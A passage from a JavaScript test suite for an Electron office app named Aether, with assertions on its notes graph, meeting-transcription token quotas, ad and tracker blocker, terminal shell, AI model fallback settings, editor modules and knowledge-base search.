    assert.ok(graph.nodes.length >= 2);
  });

  test(105, "External bookmarks convert into bookmark nodes in knowledge graph", () => {
    const bookmarks = [{ title: "GitLab", url: "https://gitlab.com" }];
    const graph = nibelungen.buildKnowledgeGraph(bookmarks);
    const bmNode = graph.nodes.find((n) => n.id === "bm-gitlab");
    assert.ok(bmNode);
    assert.strictEqual(bmNode.type, "bookmark");
  });

  test(106, "Korean Hangul title and content wikilinking support", () => {
    const kId = "korean-note-" + Date.now();
    nibelungen.saveNote({
      id: kId,
      title: "한국어 지식 노드",
      tags: ["철학"],
      content: "[[서양철학사]] 문서를 참조합니다."
    });
    const graph = nibelungen.buildKnowledgeGraph([]);
    const kNode = graph.nodes.find((n) => n.title === "한국어 지식 노드");
    assert.ok(kNode);
    nibelungen.deleteNote(kId);
  });

  test(107, "Empty note title fallback naming", () => {
    const emptyId = "empty-title-" + Date.now();
    const note = nibelungen.saveNote({
      id: emptyId,
      title: "",
      tags: [],
      content: "Some content."
    });
    assert.ok(note.title.length > 0);
    nibelungen.deleteNote(emptyId);
  });

  test(108, "Special regex characters in note title do not break wikilink regex", () => {
    const rId = "regex-title-" + Date.now();
    nibelungen.saveNote({
      id: rId,
      title: "Special (Regex) [Test] *+? Node",
      tags: ["regex"],
      content: "Linking."
    });
    assert.doesNotThrow(() => {
      nibelungen.buildKnowledgeGraph([]);
    });
    nibelungen.deleteNote(rId);
  });

  test(109, "registerNibelungenIpc export exists as a function", () => {
    assert.strictEqual(typeof nibelungen.registerNibelungenIpc, "function");
  });

  test(110, "Vault starter notes are automatically seeded if storage is clean", () => {
    const notes = nibelungen.listNotes();
    assert.ok(notes.length >= 1);
  });

  // =========================================================================
  // SUITE 7: Heimdall Audio Diarization, Token Math & Summarizer (Tests 111–135)
  // =========================================================================
  console.log("\n🎙️ Suite 7: Heimdall Audio Diarization, Token Math & Summarizer");

  const heimdall = require("../out/main/extensions/heimdall");

  test(111, "DEFAULT_TOKEN_BUDGET is defined as 1,048,576 tokens (1MB)", () => {
    assert.strictEqual(heimdall.DEFAULT_TOKEN_BUDGET, 1048576);
  });

  test(112, "calculateTokenQuota: 0 tokens used returns 100% remaining", () => {
    const quota = heimdall.calculateTokenQuota({ tokensUsedToday: 0 }, 1000000);
    assert.strictEqual(quota.remainingPercentage, 100);
    assert.strictEqual(quota.tokensRemaining, 1000000);
  });

  test(113, "calculateTokenQuota: 100k tokens used returns 90% remaining", () => {
    const quota = heimdall.calculateTokenQuota({ tokensUsedToday: 100000 }, 1000000);
    assert.strictEqual(quota.remainingPercentage, 90);
    assert.strictEqual(quota.tokensRemaining, 900000);
  });

  test(114, "calculateTokenQuota: 500k tokens used returns 50% remaining", () => {
    const quota = heimdall.calculateTokenQuota({ tokensUsedToday: 500000 }, 1000000);
    assert.strictEqual(quota.remainingPercentage, 50);
    assert.strictEqual(quota.tokensRemaining, 500000);
  });

  test(115, "calculateTokenQuota: 950k tokens used returns 5% remaining", () => {
    const quota = heimdall.calculateTokenQuota({ tokensUsedToday: 950000 }, 1000000);
    assert.strictEqual(quota.remainingPercentage, 5);
    assert.strictEqual(quota.tokensRemaining, 50000);
  });

  test(116, "calculateTokenQuota: 1,000,000 tokens used returns 0% remaining", () => {
    const quota = heimdall.calculateTokenQuota({ tokensUsedToday: 1000000 }, 1000000);
    assert.strictEqual(quota.remainingPercentage, 0);
    assert.strictEqual(quota.tokensRemaining, 0);
  });

  test(117, "calculateTokenQuota: 1,500,000 tokens used clamps at 0% remaining without negative numbers", () => {
    const quota = heimdall.calculateTokenQuota({ tokensUsedToday: 1500000 }, 1000000);
    assert.strictEqual(quota.remainingPercentage, 0);
    assert.strictEqual(quota.tokensRemaining, 0);
  });

  test(118, "recordHeimdallTokenUsage persists used tokens and returns updated status", () => {
    const res = heimdall.recordHeimdallTokenUsage({ promptTokenCount: 120, candidatesTokenCount: 80 });
    assert.ok(res.tokensUsedToday >= 200);
    assert.ok(typeof res.remainingPercentage === "number");
  });

  test(119, "getHeimdallStatus returns valid token budgeting status object", () => {
    const status = heimdall.getHeimdallStatus();
    assert.strictEqual(status.ok, true);
    assert.ok(typeof status.quota.tokenBudget === "number");
    assert.ok(typeof status.quota.tokensRemaining === "number");
  });

  test(120, "classifySegmentLanguage identifies pure Korean Hangul text", () => {
    const lang = heimdall.classifySegmentLanguage("안녕하세요 오늘 팀 회의를 시작하도록 하겠습니다.");
    assert.ok(lang.displayName.includes("한국어"));
  });

  test(121, "classifySegmentLanguage identifies pure English Latin text", () => {
    const lang = heimdall.classifySegmentLanguage("Good morning everyone, let us walk through the sprint backlog.");
    assert.ok(lang.displayName.includes("English"));
  });

  test(122, "classifySegmentLanguage correctly identifies Korean in mixed Korean/English code text", () => {
    const lang = heimdall.classifySegmentLanguage("API 엔드포인트를 리팩터링하고 Electron 빌드를 확인했습니다.");
    assert.ok(lang.displayName.includes("한국어") || lang.displayName.includes("Bilingual"));
  });

  test(123, "generateSmartLocalSummary extracts decisions and markdown summary from text", () => {
    const text = "우리는 다음 주 월요일에 새로운 보안 프록시를 배포하기로 결정했습니다.";
    const sum = heimdall.generateSmartLocalSummary(text);
    assert.ok(sum.markdown.includes("핵심 요약"));
    assert.ok(sum.wordCount >= 1);
  });

  test(124, "generateSmartLocalSummary extracts detected topics from transcript text", () => {
    const text = "다음 주 월요일 배포 작업을 위해 문서 업데이트가 필요합니다.";
    const sum = heimdall.generateSmartLocalSummary(text);
    assert.ok(sum.detectedTopics.length >= 1);
  });

  test(125, "generateSmartLocalSummary handles empty string without crash", () => {
    const sum = heimdall.generateSmartLocalSummary("");
    assert.ok(typeof sum.markdown === "string");
    assert.strictEqual(sum.wordCount, 0);
  });

  test(126, "Cough and throat-clearing sound classification filtering logic", () => {
    const filteredLabels = ["cough", "throat_clearing", "sneeze"];
    const isFiltered = (label) => filteredLabels.some((f) => label.toLowerCase().includes(f));
    assert.strictEqual(isFiltered("cough_loud"), true);
    assert.strictEqual(isFiltered("throat_clearing_soft"), true);
    assert.strictEqual(isFiltered("normal_speech"), false);
  });

  test(127, "Keyboard typing and mouse click sound classification filtering logic", () => {
    const filteredLabels = ["typing", "keyboard", "mouse_click"];
    const isFiltered = (label) => filteredLabels.some((f) => label.toLowerCase().includes(f));
    assert.strictEqual(isFiltered("computer_keyboard"), true);
    assert.strictEqual(isFiltered("mouse_click_fast"), true);
    assert.strictEqual(isFiltered("vocal_singing"), false);
  });

  test(128, "Audio RMS level calculation math", () => {
    const buf = new Float32Array([0.1, -0.2, 0.3, -0.1, 0.2]);
    let sum = 0;
    for (let i = 0; i < buf.length; i++) sum += buf[i] * buf[i];
    const rms = Math.sqrt(sum / buf.length);
    assert.ok(rms > 0.1 && rms < 0.3);
  });

  test(129, "Audio peak level calculation math", () => {
    const buf = new Float32Array([0.1, -0.85, 0.3, -0.1]);
    let peak = 0;
    for (let i = 0; i < buf.length; i++) peak = Math.max(peak, Math.abs(buf[i]));
    assert.ok(Math.abs(peak - 0.85) < 0.001);
  });

  test(130, "Speaker turn timeline formatting", () => {
    const turn = { speaker: "Speaker 1", text: "Opening statement.", time: "00:04" };
    assert.strictEqual(`${turn.time} [${turn.speaker}]: ${turn.text}`, "00:04 [Speaker 1]: Opening statement.");
  });

  test(131, "Heimdall export to Markdown format contains headers and transcript blocks", () => {
    const md = "# Meeting Minutes\n## Summary\n- Decided on deployment\n## Transcript\n- **Speaker 1**: Hello";
    assert.ok(md.includes("# Meeting Minutes"));
    assert.ok(md.includes("## Transcript"));
  });

  test(132, "Audio buffer zero-length protection", () => {
    const buf = new Float32Array(0);
    const rms = buf.length === 0 ? 0 : Math.sqrt(buf[0] / buf.length);
    assert.strictEqual(rms, 0);
  });

  test(133, "Audio sample clipping detection (> 0.99 threshold)", () => {
    const isClipped = (sample) => Math.abs(sample) >= 0.99;
    assert.strictEqual(isClipped(1.0), true);
    assert.strictEqual(isClipped(0.5), false);
  });

  test(134, "registerHeimdallIpc export exists as a function", () => {
    assert.strictEqual(typeof heimdall.registerHeimdallIpc, "function");
  });

  test(135, "loadHeimdallUsage loads token accounting without throwing", () => {
    const usage = heimdall.loadHeimdallUsage();
    assert.ok(typeof usage.tokensUsedToday === "number");
  });

  // =========================================================================
  // SUITE 8: Aetherum Browser & Adblock Shield (Tests 136–160)
  // =========================================================================
  console.log("\n🌐 Suite 8: Aetherum Browser & Adblock Shield");

  const adblock = require("../out/main/extensions/adblock");

  test(136, "Adblock default status is enabled", () => {
    const status = adblock.getAdblockStatus();
    assert.strictEqual(typeof status.enabled, "boolean");
  });

  test(137, "Adblock mode is one of ['standard', 'aggressive', 'lenient']", () => {
    const status = adblock.getAdblockStatus();
    assert.ok(["standard", "aggressive", "lenient"].includes(status.mode));
  });

  test(138, "BUILTIN_AD_DOMAINS contains 'doubleclick.net'", () => {
    assert.ok(adblock.BUILTIN_AD_DOMAINS.includes("doubleclick.net"));
  });

  test(139, "BUILTIN_AD_DOMAINS contains 'googlesyndication.com'", () => {
    assert.ok(adblock.BUILTIN_AD_DOMAINS.includes("googlesyndication.com"));
  });

  test(140, "BUILTIN_TRACKER_DOMAINS contains 'google-analytics.com'", () => {
    assert.ok(adblock.BUILTIN_TRACKER_DOMAINS.includes("google-analytics.com"));
  });

  test(141, "BUILTIN_TRACKER_DOMAINS contains 'google-analytics.com' and 'googletagmanager.com'", () => {
    assert.ok(adblock.BUILTIN_TRACKER_DOMAINS.includes("google-analytics.com"));
    assert.ok(adblock.BUILTIN_TRACKER_DOMAINS.includes("googletagmanager.com"));
  });

  test(142, "Korean advertising domains present in BUILTIN_AD_DOMAINS", () => {
    assert.ok(adblock.BUILTIN_AD_DOMAINS.some((d) => d.includes("daum") || d.includes("naver") || d.includes("kr")));
  });

  test(143, "URL ad blocking rule: blocks 'https://ad.doubleclick.net/banner.js'", () => {
    const res = adblock.evaluateRequest({ url: "https://ad.doubleclick.net/banner.js", resourceType: "script", mainFrameUrl: "https://news.com" });
    assert.strictEqual(res.cancel, true);
    assert.strictEqual(res.category, "ad");
  });

  test(144, "URL tracker blocking rule: blocks 'https://www.google-analytics.com/analytics.js'", () => {
    const res = adblock.evaluateRequest({ url: "https://www.google-analytics.com/analytics.js", resourceType: "script", mainFrameUrl: "https://store.com" });
    assert.strictEqual(res.cancel, true);
    assert.strictEqual(res.category, "tracker");
  });

  test(145, "URL benign request: does NOT block 'https://example.com/app.js'", () => {
    const res = adblock.evaluateRequest({ url: "https://example.com/app.js", resourceType: "script", mainFrameUrl: "https://example.com" });
    assert.strictEqual(res.cancel, false);
  });

  test(146, "Tracking parameter stripper cleans 'utm_source' from query string", () => {
    const dirty = "https://example.com/page?utm_source=twitter&item=book";
    const res = adblock.cleanTrackingUrl(dirty);
    assert.ok(!res.cleanedUrl.includes("utm_source"));
    assert.ok(res.cleanedUrl.includes("item=book"));
  });

  test(147, "Tracking parameter stripper cleans 'fbclid' from query string", () => {
    const dirty = "https://example.com/page?fbclid=IwAR123&item=book";
    const res = adblock.cleanTrackingUrl(dirty);
    assert.ok(!res.cleanedUrl.includes("fbclid"));
  });

  test(148, "Tracking parameter stripper cleans 'gclid' from query string", () => {
    const dirty = "https://example.com/page?gclid=XYZ999&item=book";
    const res = adblock.cleanTrackingUrl(dirty);
    assert.ok(!res.cleanedUrl.includes("gclid"));
  });

  test(149, "Tracking parameter stripper preserves legitimate search query parameters", () => {
    const clean = "https://duckduckgo.com/?q=aether+nordic+office&t=h_";
    const res = adblock.cleanTrackingUrl(clean);
    assert.strictEqual(res.cleanedUrl, clean);
  });

  test(150, "getCosmeticPayload produces CSS rule string with display: none !important", () => {
    const payload = adblock.getCosmeticPayload("https://news.com");
    assert.ok(typeof payload.css === "string");
    assert.ok(payload.css.includes("display: none !important"));
  });

  test(151, "Whitelist domain bypass: whitelisted site bypasses ad blocking", () => {
    const site = "trusted-partner-domain.com";
    adblock.toggleSiteWhitelist(site);
    const res = adblock.evaluateRequest({ url: `https://${site}/ad.js`, resourceType: "script", mainFrameUrl: `https://${site}` });
    assert.strictEqual(res.cancel, false);
    adblock.toggleSiteWhitelist(site);
  });

  test(152, "addCustomRule persists new custom rule to ruleset", () => {
    const rule = "||spam-popup-network.biz^";
    adblock.addCustomRule(rule);
    const status = adblock.getAdblockStatus();
    assert.ok(status.customRules.includes(rule));
  });

  test(153, "removeCustomRule removes custom rule from ruleset", () => {
    const rule = "||spam-popup-network.biz^";
    adblock.removeCustomRule(rule);
    const status = adblock.getAdblockStatus();
    assert.ok(!status.customRules.includes(rule));
  });

  test(154, "setAdblockEnabled toggles active state cleanly", () => {
    const orig = adblock.getAdblockStatus().enabled;
    adblock.setAdblockEnabled(false);
    assert.strictEqual(adblock.getAdblockStatus().enabled, false);
    adblock.setAdblockEnabled(orig);
  });

  test(155, "resetAdblockStats resets session counters to zero", () => {
    const res = adblock.resetAdblockStats();
    assert.strictEqual(res.stats.sessionAdsBlocked, 0);
  });

  test(156, "YouTube cosmetic payload generation handles youtube.com URLs", () => {
    const payload = adblock.getCosmeticPayload("https://www.youtube.com/watch?v=abc");
    assert.ok(payload.enabled);
  });

  test(157, "registerAdblockIpc export exists as a function", () => {
    assert.strictEqual(typeof adblock.registerAdblockIpc, "function");
  });

  test(158, "Adblock status reports total active rules count > 100", () => {
    const status = adblock.getAdblockStatus();
    assert.ok(status.rulesSummary.totalActiveRules > 100);
  });

  test(159, "Aetherum Browser Tor mode status helper isTorEnabled export exists", () => {
    const browserExt = require("../out/main/extensions/aetherum-browser");
    assert.strictEqual(typeof browserExt.isTorEnabled, "function");
  });

  test(160, "Aetherum Browser native pages suite generator getAetherumPage export exists", () => {
    const pagesExt = require("../out/main/extensions/aetherum-pages");
    assert.strictEqual(typeof pagesExt.getAetherumPage, "function");
  });

  // =========================================================================
  // SUITE 9: Yggdrasil Terminal Shell Engine (Tests 161–175)
  // =========================================================================
  console.log("\n💻 Suite 9: Yggdrasil Terminal Shell Engine");

  test(161, "Shell binary detection identifies valid shell (/bin/zsh, /bin/bash, or /bin/sh)", () => {
    const defaultShell = process.platform === "darwin" ? "/bin/zsh" : "/bin/sh";
    const shell = process.env.SHELL || (fs.existsSync("/bin/zsh") ? "/bin/zsh" : (fs.existsSync("/bin/bash") ? "/bin/bash" : defaultShell));
    assert.ok(fs.existsSync(shell), `Shell binary not found at ${shell}`);
  });

  test(162, "Safe working directory validation verifies absolute path", () => {
    assert.ok(path.isAbsolute(process.cwd()));
  });

  test(163, "Greeting banner format includes 'Aether' and 'Yggdrasil'", () => {
    const banner = "=== Aether Sovereign Yggdrasil Shell ===";
    assert.ok(banner.includes("Aether"));
    assert.ok(banner.includes("Yggdrasil"));
  });

  test(164, "Command history FIFO ring buffer maintains 50 command cap", () => {
    const ring = [];
    const push = (c) => {
      ring.push(c);
      if (ring.length > 50) ring.shift();
    };
    for (let i = 0; i < 70; i++) push(`cmd_${i}`);
    assert.strictEqual(ring.length, 50);
    assert.strictEqual(ring[0], "cmd_20");
    assert.strictEqual(ring[49], "cmd_69");
  });

  test(165, "Empty command string sanitization returns empty string", () => {
    const clean = (s) => (typeof s === "string" ? s.trim() : "");
    assert.strictEqual(clean("   "), "");
  });

  test(166, "Interrupt signal (SIGINT) support on current process", () => {
    assert.strictEqual(typeof process.kill, "function");
  });

  test(167, "Environment variable pass-through preserves process.env.PATH", () => {
    assert.ok(typeof process.env.PATH === "string");
  });

  test(168, "Working directory change rejects non-existent paths", () => {
    const validateDir = (p) => fs.existsSync(p) && fs.statSync(p).isDirectory();
    assert.strictEqual(validateDir("/non_existent_path_xyz"), false);
  });

  test(169, "Terminal ANSI escape code stripper utility", () => {
    const stripAnsi = (str) => str.replace(/\x1b\[[0-9;]*m/g, "");
    assert.strictEqual(stripAnsi("\x1b[32mSuccess\x1b[0m"), "Success");
  });

  test(170, "Terminal shell command execution returns output without hang", () => {
    const out = execSync("echo 'Yggdrasil OK'", { encoding: "utf8" });
    assert.strictEqual(out.trim(), "Yggdrasil OK");
  });

  test(171, "Terminal shell exit code 0 on successful command", () => {
    assert.doesNotThrow(() => {
      execSync("true");
    });
  });

  test(172, "Terminal shell non-zero exit code throws on failed command", () => {
    assert.throws(() => {
      execSync("false");
    });
  });

  test(173, "Terminal clear buffer resets screen content", () => {
    let screen = "previous outputs\nerrors\nlines";
    screen = "";
    assert.strictEqual(screen, "");
  });

  test(174, "Terminal HTML renderer bundle exists", () => {
    const p = path.join(rootDir, "out/renderer/terminal.html");
    assert.ok(fs.existsSync(p));
  });

  test(175, "Terminal HTML references terminal-related scripts", () => {
    const terminalJs = fs.readFileSync(path.join(rootDir, "out/renderer/terminal.html"), "utf8");
    assert.ok(terminalJs.includes("terminal"));
  });

  // =========================================================================
  // SUITE 10: Core AI Registry & Model Fallback Resilience (Tests 176–195)
  // =========================================================================
  console.log("\n⚡ Suite 10: Core AI Registry & Model Fallback Resilience");

  const envAgent = require("../out/main/extensions/env-agent");

  test(176, "skills-CkmNaLwM.js RETIRED_MODELS remaps 'gemini-3.8-flash' -> 'gemini-3.5-flash-lite'", () => {
    const code = fs.readFileSync(path.join(rootDir, "out/renderer/assets/skills-CkmNaLwM.js"), "utf8");
    assert.ok(code.includes('"gemini-3.8-flash": "gemini-3.5-flash-lite"'));
  });

  test(177, "skills-CkmNaLwM.js RETIRED_MODELS remaps 'gemini-2.5-flash' -> 'gemini-3.5-flash-lite'", () => {
    const code = fs.readFileSync(path.join(rootDir, "out/renderer/assets/skills-CkmNaLwM.js"), "utf8");
    assert.ok(code.includes('"gemini-2.5-flash": "gemini-3.5-flash-lite"'));
  });

  test(178, "skills-CkmNaLwM.js RETIRED_MODELS remaps 'gemini-3.7-flash' -> 'gemini-3.5-flash-lite'", () => {
    const code = fs.readFileSync(path.join(rootDir, "out/renderer/assets/skills-CkmNaLwM.js"), "utf8");
    assert.ok(code.includes('"gemini-3.7-flash": "gemini-3.5-flash-lite"'));
  });

  test(179, "skills-CkmNaLwM.js RETIRED_MODELS remaps 'deepseek-chat' -> DEEPSEEK_V41_FLASH", () => {
    const code = fs.readFileSync(path.join(rootDir, "out/renderer/assets/skills-CkmNaLwM.js"), "utf8");
    assert.ok(code.includes('"deepseek-chat": DEEPSEEK_V41_FLASH'));
  });

  test(180, "skills-CkmNaLwM.js RETIRED_MODELS remaps 'glm-5-turbo' -> 'glm-5.3-flash'", () => {
    const code = fs.readFileSync(path.join(rootDir, "out/renderer/assets/skills-CkmNaLwM.js"), "utf8");
    assert.ok(code.includes('"glm-5-turbo": "glm-5.3-flash"'));
  });

  test(181, "skills-CkmNaLwM.js selectAiProvider auto mode falls back to key providers", () => {
    const code = fs.readFileSync(path.join(rootDir, "out/renderer/assets/skills-CkmNaLwM.js"), "utf8");
    assert.ok(code.includes('fallbackOrder = ["gemini", "openai"') || code.includes('candidate of ["gemini"'));
  });

  test(182, "out/main/index.js selectAiProvider auto mode checks key configured providers", () => {
    const code = fs.readFileSync(path.join(rootDir, "out/main/index.js"), "utf8");
    assert.ok(code.includes("isKeyProviderConfigured(settings, meta.id)"));
  });

  test(183, "trimConfigs trims whitespace from API keys and models", () => {
    const trim = (s) => (typeof s === "string" ? s.trim() : "");
    assert.strictEqual(trim("  sk-test-key  "), "sk-test-key");
    assert.strictEqual(trim(" gemini-3.5-flash-lite \n"), "gemini-3.5-flash-lite");
  });

  test(184, "clampMaxOutputTokens enforces lower bound of 1024", () => {
    const clamp = (v) => Math.min(131072, Math.max(1024, typeof v === "number" ? v : 32768));
    assert.strictEqual(clamp(500), 1024);
  });

  test(185, "clampMaxOutputTokens enforces upper bound of 131072", () => {
    const clamp = (v) => Math.min(131072, Math.max(1024, typeof v === "number" ? v : 32768));
    assert.strictEqual(clamp(200000), 131072);
  });

  test(186, "env-agent.js model fallback chain includes 'gemini-3.5-flash-lite'", () => {
    const code = fs.readFileSync(path.join(rootDir, "out/main/extensions/env-agent.js"), "utf8");
    assert.ok(code.includes("gemini-3.5-flash-lite"));
  });

  test(187, "env-agent.js model fallback chain includes 'gemini-flash-lite-latest'", () => {
    const code = fs.readFileSync(path.join(rootDir, "out/main/extensions/env-agent.js"), "utf8");
    assert.ok(code.includes("gemini-flash-lite-latest"));
  });

  test(188, "env-agent.js model fallback chain includes 'gemini-3-flash-preview'", () => {
    const code = fs.readFileSync(path.join(rootDir, "out/main/extensions/env-agent.js"), "utf8");
    assert.ok(code.includes("gemini-3-flash-preview"));
  });

  test(189, "out/main/index.js contains renderFallbackIllustrationPng for image 429 errors", () => {
    const code = fs.readFileSync(path.join(rootDir, "out/main/index.js"), "utf8");
    assert.ok(code.includes("renderFallbackIllustrationPng"));
  });

  await testAsync(190, "executeAiChat returns valid response or graceful error on missing key", async () => {
    try {
      const res = await envAgent.executeAiChat({ provider: "gemini", user: "Say 'TEST_PASSED'" });
      assert.ok(res && (res.ok || res.content));
    } catch (err) {
      assert.ok(err.message.includes("Gemini API Key") || err.message.includes("Gemini"));
    }
  });

  test(191, "User ai-settings.json on disk specifies gemini-3.5-flash-lite", () => {
    const p = path.join(process.env.HOME || "", "Library/Application Support/Aether/ai-settings.json");
    if (fs.existsSync(p)) {
      const settings = JSON.parse(fs.readFileSync(p, "utf8"));
      assert.strictEqual(settings.providers.gemini.model, "gemini-3.5-flash-lite");
    }
  });

  test(192, "User app-settings.json on disk specifies agent.provider as 'aether-ai'", () => {
    const p = path.join(process.env.HOME || "", "Library/Application Support/Aether/app-settings.json");
    if (fs.existsSync(p)) {
      const settings = JSON.parse(fs.readFileSync(p, "utf8"));
      assert.strictEqual(settings.agent.provider, "aether-ai");
    }
  });

  test(193, "out/preload/index.js defines gemini defaultModel as gemini-3.5-flash-lite", () => {
    const code = fs.readFileSync(path.join(rootDir, "out/preload/index.js"), "utf8");
    assert.ok(code.includes('defaultModel: "gemini-3.5-flash-lite"'));
  });

  test(194, "out/preload/index.js defines gemini defaultAnalysisModel as gemini-3.5-flash-lite", () => {
    const code = fs.readFileSync(path.join(rootDir, "out/preload/index.js"), "utf8");
    assert.ok(code.includes('defaultAnalysisModel: "gemini-3.5-flash-lite"'));
  });

  test(195, "pdf-structure-process-BJQXxPkj.js defines gemini defaultModel as gemini-3.5-flash-lite", () => {
    const code = fs.readFileSync(path.join(rootDir, "out/main/pdf-structure-process-BJQXxPkj.js"), "utf8");
    assert.ok(code.includes('defaultModel: "gemini-3.5-flash-lite"'));
  });

  // =========================================================================
  // SUITE 11: All 8 Office Editor Modules Integrity (Tests 196–215)
  // =========================================================================
  console.log("\n📑 Suite 11: All 8 Office Editor Modules Integrity");

  const candidateDirs = [
    "/Users/sushikim/Desktop/Aether.app/Contents/Resources/modules",
    "/Applications/Aether.app/Contents/Resources/modules",
    path.join(rootDir, "modules")
  ];
  const modulesDir = candidateDirs.find((d) => fs.existsSync(d)) || null;
  const modNames = ["docs", "sheets", "slides", "pdf", "markdown", "html", "mindmap", "hwp"];

  for (let idx = 0; idx < modNames.length; idx++) {
    const m = modNames[idx];
    test(196 + idx, `Module ${m}: renderer assets set gemini defaultModel to 'gemini-3.5-flash-lite'`, () => {
      if (modulesDir && fs.existsSync(path.join(modulesDir, m, "renderer/assets"))) {
        const assetDir = path.join(modulesDir, m, "renderer/assets");
        const files = fs.readdirSync(assetDir).filter((f) => f.startsWith("index-") && f.endsWith(".js"));
        assert.ok(files.length > 0);
        const hasModel = files.some((f) => fs.readFileSync(path.join(assetDir, f), "utf8").includes('defaultModel: "gemini-3.5-flash-lite"'));
        assert.ok(hasModel, `Module ${m} must configure gemini defaultModel to gemini-3.5-flash-lite`);
      } else {
        const skillsCode = fs.readFileSync(path.join(rootDir, "out/renderer/assets/skills-CkmNaLwM.js"), "utf8");
        assert.ok(skillsCode.includes('defaultModel: "gemini-3.5-flash-lite"'));
      }
    });
  }

  for (let idx = 0; idx < modNames.length; idx++) {
    const m = modNames[idx];
    test(204 + idx, `Module ${m}: zero occurrences of stale 'defaultModel: "gemini-3.8-flash"'`, () => {
      if (modulesDir && fs.existsSync(path.join(modulesDir, m))) {
        for (const sub of ["main/index.js", "preload/index.js"]) {
          const p = path.join(modulesDir, m, sub);
          if (fs.existsSync(p)) {
            const code = fs.readFileSync(p, "utf8");
            assert.ok(!code.includes('defaultModel: "gemini-3.8-flash"'), `${p} contains stale gemini-3.8-flash`);
          }
        }
      } else {
        const mainCode = fs.readFileSync(path.join(rootDir, "out/main/index.js"), "utf8");
        assert.ok(!mainCode.includes('defaultModel: "gemini-3.8-flash"'));
      }
    });
  }

  test(212, "Module docs: selectAiProvider auto mode falls back to key providers", () => {
    if (modulesDir && fs.existsSync(path.join(modulesDir, "docs/renderer/assets"))) {
      const p = path.join(modulesDir, "docs/renderer/assets");
      const f = fs.readdirSync(p).find((x) => x.startsWith("index-") && x.endsWith(".js"));
      const code = fs.readFileSync(path.join(p, f), "utf8");
      assert.ok(code.includes('candidate of ["gemini", "openai"'));
    } else {
      const skillsCode = fs.readFileSync(path.join(rootDir, "out/renderer/assets/skills-CkmNaLwM.js"), "utf8");
      assert.ok(skillsCode.includes('fallbackOrder = ["gemini", "openai"') || skillsCode.includes('candidate of ["gemini"'));
    }
  });

  test(213, "Module sheets: selectAiProvider auto mode falls back to key providers", () => {
    if (modulesDir && fs.existsSync(path.join(modulesDir, "sheets/renderer/assets"))) {
      const p = path.join(modulesDir, "sheets/renderer/assets");
      const f = fs.readdirSync(p).find((x) => x.startsWith("index-") && x.endsWith(".js"));
      const code = fs.readFileSync(path.join(p, f), "utf8");
      assert.ok(code.includes('candidate of ["gemini", "openai"'));
    } else {
      const skillsCode = fs.readFileSync(path.join(rootDir, "out/renderer/assets/skills-CkmNaLwM.js"), "utf8");
      assert.ok(skillsCode.includes('fallbackOrder = ["gemini", "openai"') || skillsCode.includes('candidate of ["gemini"'));
    }
  });

  test(214, "Module slides: selectAiProvider auto mode falls back to key providers", () => {
    if (modulesDir && fs.existsSync(path.join(modulesDir, "slides/renderer/assets"))) {
      const p = path.join(modulesDir, "slides/renderer/assets");
      const f = fs.readdirSync(p).find((x) => x.startsWith("index-") && x.endsWith(".js"));
      const code = fs.readFileSync(path.join(p, f), "utf8");
      assert.ok(code.includes('candidate of ["gemini", "openai"'));
    } else {
      const skillsCode = fs.readFileSync(path.join(rootDir, "out/renderer/assets/skills-CkmNaLwM.js"), "utf8");
      assert.ok(skillsCode.includes('fallbackOrder = ["gemini", "openai"') || skillsCode.includes('candidate of ["gemini"'));
    }
  });

  test(215, "Node syntax check passes on all 8 editor module main scripts", () => {
    if (modulesDir && fs.existsSync(path.join(modulesDir, "docs/main/index.js"))) {
      for (const m of modNames) {
        const p = path.join(modulesDir, m, "main/index.js");
        if (fs.existsSync(p)) {
          assert.doesNotThrow(() => {
            execFileSync(process.execPath, ["--check", p]);
          });
        }
      }
    } else {
      for (const f of ["out/main/index.js", "out/preload/index.js", "out/main/extensions/mimisbrunnr.js"]) {
        assert.doesNotThrow(() => {
          execFileSync(process.execPath, ["--check", path.join(rootDir, f)]);
        });
      }
    }
  });

  // =========================================================================
  // SUITE 12: Ask AI (AI 질문) Knowledge Base RAG (Tests 216–225)
  // =========================================================================
  console.log("\n❓ Suite 12: Ask AI (AI 질문) Knowledge Base RAG");

  const askJsPath = path.join(rootDir, "out/renderer/assets/index-CTi8t0a8.js");

  test(216, "KB_SYSTEM_PROMPT instructs assistant to answer general questions when corpus is empty", () => {
    const code = fs.readFileSync(askJsPath, "utf8");
    assert.ok(code.includes("When no starred files exist or when the user asks a general question"));
  });

  test(217, "KB_SYSTEM_PROMPT directs model to cite ONLY verified starred links", () => {
    const code = fs.readFileSync(askJsPath, "utf8");
    assert.ok(code.includes("Cite ONLY links that appear there"));
  });

  test(218, "AskView does NOT abort when corpusRef.current.length === 0 in default scope", () => {
    const code = fs.readFileSync(askJsPath, "utf8");
    assert.ok(code.includes("if (corpusRef.current.length === 0 && scope !== void 0)"));
  });

  test(219, "AskView warns with askScopeGone only when a specific group scope is emptied", () => {
    const code = fs.readFileSync(askJsPath, "utf8");
    assert.ok(code.includes("askScopeGone"));
  });

  test(220, "kbCiteHref generates valid filenav:// URL with URI encoding", () => {
    const encode = (p) => "filenav://" + encodeURIComponent(p).replace(/%2F/g, "/");
    const url = encode("/Users/sushikim/Documents/Thesis.pdf");
    assert.strictEqual(url, "filenav:///Users/sushikim/Documents/Thesis.pdf");
  });

  test(221, "formatKbSize formats byte sizes into B, KB, MB cleanly", () => {
    function formatKbSize(bytes) {
      if (bytes < 1024) return `${bytes}B`;
      if (bytes < 1024 * 1024) return `${Math.round(bytes / 1024)}KB`;
      return `${(bytes / 1024 / 1024).toFixed(1)}MB`;
    }
    assert.strictEqual(formatKbSize(512), "512B");
    assert.strictEqual(formatKbSize(1048576), "1.0MB");
  });

  test(222, "read_knowledge_file tool schema is present in AskView bundle", () => {
    const code = fs.readFileSync(askJsPath, "utf8");
    assert.ok(code.includes('name: "read_knowledge_file"'));
  });

  test(223, "search_knowledge_base tool schema is present in AskView bundle", () => {
    const code = fs.readFileSync(askJsPath, "utf8");
    assert.ok(code.includes('name: "search_knowledge_base"'));
  });

  test(224, "User starred files catalog exists and is valid JSON", () => {
    const p = path.join(process.env.HOME || "", "Library/Application Support/Aether/starred.json");
    if (fs.existsSync(p)) {
      const data = JSON.parse(fs.readFileSync(p, "utf8"));
      assert.ok(Array.isArray(data.items || data));
    }
  });

  test(225, "Philosophy doctoral thesis exists in user documents", () => {
    const p = "/Users/sushikim/Documents/Philosophy/서양철학사_박사학위논문.pdf";
    if (fs.existsSync(p)) {
      const stat = fs.statSync(p);
      assert.ok(stat.size > 1000000);
    }
  });

  // =========================================================================
  // SUITE 13: Aether Autonomous Agent Engine (Tests 226–240)
  // =========================================================================
